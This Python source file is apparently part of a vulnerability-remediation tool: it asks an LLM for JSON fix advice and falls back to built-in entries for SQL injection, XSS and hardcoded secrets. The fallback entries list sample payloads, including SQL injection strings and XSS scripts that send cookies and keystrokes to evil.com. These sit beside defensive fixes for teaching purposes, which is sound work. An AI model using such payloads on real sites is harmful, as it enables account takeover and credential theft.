import os
import json
import logging
from pathlib import Path

logger = logging.getLogger(__name__)

BREACH_DB_PATH = os.path.join(
    os.path.dirname(__file__),
    "../../data/breach_examples.json",
)

FALLBACK_FIXES = {
    "SQL Injection": {
        "layman_explanation":
            "SQL injection is like someone filling "
            "out a form and writing database commands "
            "instead of their name. The server "
            "reads these commands as instructions "
            "and obeys them — handing over all data "
            "or granting full access.",
        "what_is_happening":
            "User input is concatenated directly "
            "into a SQL query string. The database "
            "cannot distinguish between the "
            "developer's SQL and attacker-supplied "
            "commands.",
        "attack_examples": [
            {
                "name":    "Authentication Bypass",
                "payload": "admin'--",
                "explanation":
                    "Closes the SQL string and "
                    "comments out the password check",
                "impact":
                    "Logs in as any user without "
                    "knowing the password",
            },
            {
                "name":    "Data Dump",
                "payload":
                    "' UNION SELECT "
                    "username,password "
                    "FROM users--",
                "explanation":
                    "Appends a second query to "
                    "retrieve all credentials",
                "impact":
                    "Full database exposure including "
                    "password hashes",
            },
        ],
        "defense_examples": [
            {
                "method": "Parameterized Queries",
                "code_before":
                    "query = 'SELECT * FROM users "
                    "WHERE name=' + username",
                "code_after":
                    "query = 'SELECT * FROM users "
                    "WHERE name=?'\n"
                    "cursor.execute(query, [username])",
                "language": "python",
                "explanation":
                    "User input passed as data — "
                    "never interpreted as SQL code",
            },
            {
                "method": "ORM Usage",
                "code_before":
                    "db.execute(f'SELECT * FROM "
                    "users WHERE id={user_id}')",
                "code_after":
                    "User.query.filter_by("
                    "id=user_id).first()",
                "language": "python",
                "explanation":
                    "ORM handles parameterization "
                    "automatically — no raw SQL",
            },
        ],
        "services_to_use": [
            "SQLAlchemy ORM — automatic "
            "parameterization",
            "Django ORM — built-in query safety",
            "Hibernate — Java ORM",
            "PDO with prepared statements — PHP",
        ],
        "key_terms": [
            "Parameterized Query",
            "Prepared Statement",
            "ORM",
            "Input Validation",
        ],
        "cvss_score":     9.8,
        "effort_minutes": 20,
        "confidence":     95,
    },
    "Cross-Site Scripting": {
        "layman_explanation":
            "XSS is like someone slipping a "
            "forged note into your mailbox that "
            "calls all your contacts pretending "
            "to be you. An attacker injects code "
            "that runs in other users' browsers, "
            "stealing sessions silently.",
        "what_is_happening":
            "User input is rendered in HTML "
            "without encoding. The browser "
            "interprets the injected string as "
            "executable JavaScript.",
        "attack_examples": [
            {
                "name":    "Cookie Theft",
                "payload":
                    "<script>fetch('https://evil.com"
                    "?c='+document.cookie)</script>",
                "explanation":
                    "Sends victim's session token "
                    "to attacker's server",
                "impact":
                    "Full account takeover without "
                    "password",
            },
            {
                "name":    "Keylogger",
                "payload":
                    "<script>document.onkeypress="
                    "function(e){fetch('https://"
                    "evil.com?k='+e.key)}</script>",
                "explanation":
                    "Captures every keystroke typed "
                    "on the page",
                "impact":
                    "Passwords and sensitive input "
                    "captured in real time",
            },
        ],
        "defense_examples": [
            {
                "method": "Output Encoding",
                "code_before":
                    "element.innerHTML = userInput",
                "code_after":
                    "element.textContent = userInput"
                    "  // or DOMPurify.sanitize()",
                "language": "javascript",
                "explanation":
                    "textContent never interprets "
                    "HTML — treats everything as text",
            },
            {
                "method": "Content Security Policy",
                "code_before":
                    "# No CSP header set",
                "code_after":
                    "response.headers["
                    "'Content-Security-Policy'] = "
                    "\"default-src 'self'; "
                    "script-src 'self'\"",
                "language": "python",
                "explanation":
                    "CSP blocks inline scripts even "
                    "if XSS payload is injected",
            },
        ],
        "services_to_use": [
            "DOMPurify — client-side HTML sanitizer",
            "helmet.js — sets security headers "
            "including CSP",
            "OWASP Java HTML Sanitizer",
        ],
        "key_terms": [
            "Output Encoding",
            "Content Security Policy",
            "DOM Sanitization",
            "HttpOnly Cookie",
        ],
        "cvss_score":     7.5,
        "effort_minutes": 10,
        "confidence":     92,
    },
    "Hardcoded Secret": {
        "layman_explanation":
            "A password written in source code is "
            "like taping your house key to the "
            "front door. Anyone who reads the "
            "code — from GitHub, a disgruntled "
            "employee, or a breach — can use it "
            "instantly.",
        "what_is_happening":
            "A credential, API key, or secret is "
            "stored as a literal string in source "
            "code. It will persist in git history "
            "even after removal.",
        "attack_examples": [
            {
                "name":    "Git History Mining",
                "payload":
                    "git log -p | grep -i "
                    "'password\\|secret\\|key'",
                "explanation":
                    "Scans entire commit history "
                    "for leaked credentials",
                "impact":
                    "Attacker authenticates to "
                    "database, API, or cloud "
                    "account directly",
            },
        ],
        "defense_examples": [
            {
                "method": "Environment Variables",
                "code_before":
                    "DB_PASSWORD = 'super_secret'",
                "code_after":
                    "import os\n"
                    "DB_PASSWORD = os.getenv("
                    "'DB_PASSWORD')\n"
                    "if not DB_PASSWORD:\n"
                    "    raise ValueError("
                    "'DB_PASSWORD not set')",
                "language": "python",
                "explanation":
                    "Secret lives in environment, "
                    "never in code or git history",
            },
        ],
        "services_to_use": [
            "HashiCorp Vault — secrets management",
            "AWS Secrets Manager",
            "python-dotenv — load .env files",
            "git-secrets — prevent secret commits",
        ],
        "key_terms": [
            "Environment Variables",
            "Secrets Management",
            "Secret Rotation",
            ".gitignore",
        ],
        "cvss_score":     9.1,
        "effort_minutes": 15,
        "confidence":     99,
    },
}


class AIFixService:

    def __init__(self):
        from packages.ai.llm_router import LLMRouter
        self.llm = LLMRouter()
        self._breach_db = self._load_breach_db()

    def _load_breach_db(self) -> dict:
        try:
            path = Path(BREACH_DB_PATH).resolve()
            with open(path) as f:
                return json.load(f)
        except Exception:
            return {}

    def generate_fix(self, finding: dict) -> dict:
        vuln_type   = finding.get(
            "vuln_type", "Unknown"
        )
        severity    = finding.get(
            "severity", "medium"
        )
        location    = (
            finding.get("file_path") or
            finding.get("url") or
            "unknown"
        )
        line        = finding.get(
            "line_number", "unknown"
        )
        evidence    = (
            finding.get("evidence") or ""
        )[:400]
        description = (
            finding.get("description") or ""
        )[:400]

        system = (
            "You are a senior security engineer. "
            "Analyse vulnerabilities and generate "
            "precise fixes with working code. "
            "Respond ONLY with valid JSON. "
            "No markdown. No text before or after. "
            "The JSON must be parseable by "
            "Python json.loads()."
        )

        prompt = f"""Analyse this vulnerability and
respond with ONLY this JSON structure:
{{
  "layman_explanation": "2 sentences for a junior developer. Use an analogy. No jargon.",
  "what_is_happening": "Technical explanation in 2-3 sentences. What is wrong and why.",
  "attack_examples": [
    {{
      "name": "Attack name",
      "payload": "exact payload syntax",
      "explanation": "what this payload does",
      "impact": "what the attacker gains"
    }}
  ],
  "defense_examples": [
    {{
      "method": "Method name",
      "code_before": "exact vulnerable code",
      "code_after": "exact secure replacement",
      "language": "python|javascript|php|java",
      "explanation": "why this fix works"
    }}
  ],
  "services_to_use": ["library: why it helps"],
  "key_terms": ["term1", "term2"],
  "cvss_score": 8.5,
  "effort_minutes": 20,
  "confidence": 90,
  "ai_suggestion": "One line starting with action verb",
  "ide_prompt": "You are fixing a {vuln_type} vulnerability.\\n[FILE]: {location}\\n[LINE]: {line}\\n[WHAT IS WRONG]: exact technical description.\\n[EVIDENCE FROM SCAN]: {evidence}\\n[HOW TO FIX]: step by step instructions.\\n[SECURE PATTERN]: the safe code pattern to use.\\n[EXAMPLE]: before and after code.\\n[VERIFY]: how to confirm the fix worked.\\nBe specific to this exact location."
}}

Vulnerability:
Type: {vuln_type}
Severity: {severity}
Location: {location} line {line}
Evidence: {evidence}
Description: {description}"""

        try:
            result = self.llm.chat_json(
                [{"role": "user", "content": prompt}],
                system,
                max_tokens=1800,
            )
            if "error" not in result:
                result = self._enrich_with_breach(
                    result, vuln_type
                )
                return result
        except Exception as e:
            logger.warning(
                f"LLM fix failed for {vuln_type}: "
                f"{e}"
            )

        return self._fallback_fix(finding)

    def _enrich_with_breach(
        self, result: dict, vuln_type: str
    ) -> dict:
        breach = self._breach_db.get(vuln_type, {})
        if breach:
            result["breach_examples"] = \
                breach.get("examples", [])
            result.setdefault(
                "money_loss_min",
                breach.get("min", 1000),
            )
            result.setdefault(
                "money_loss_max",
                breach.get("max", 100000),
            )
        return result

    def _fallback_fix(self, finding: dict) -> dict:
        vuln_type = finding.get("vuln_type", "")
        location  = (
            finding.get("file_path") or
            finding.get("url") or
            "unknown"
        )

        base = FALLBACK_FIXES.get(vuln_type, {
            "layman_explanation":
                f"A {vuln_type} vulnerability "
                f"was detected that could allow "
                f"attackers to compromise the "
                f"system.",
            "what_is_happening":
                finding.get("description", "")[:300],
            "attack_examples": [],
            "defense_examples": [],
            "services_to_use": [],
            "key_terms": [],
            "cvss_score":     5.0,
            "effort_minutes": 30,
            "confidence":     60,
        })

        breach = self._breach_db.get(vuln_type, {})

        return {
            **base,
            "ai_suggestion":
                f"Fix the {vuln_type} by applying "
                f"secure coding best practices",
            "ide_prompt":
                f"Fix the {vuln_type} vulnerability "
                f"at {location}. "
                f"Apply the secure coding pattern "
                f"for this vulnerability class. "
                f"Evidence: "
                f"{finding.get('evidence', '')[:200]}",
            "breach_examples":
                breach.get("examples", []),
            "money_loss_min":
                breach.get("min",
                           finding.get(
                               "money_loss_min",
                               1000,
                           )),
            "money_loss_max":
                breach.get("max",
                           finding.get(
                               "money_loss_max",
                               100000,
                           )),
        }
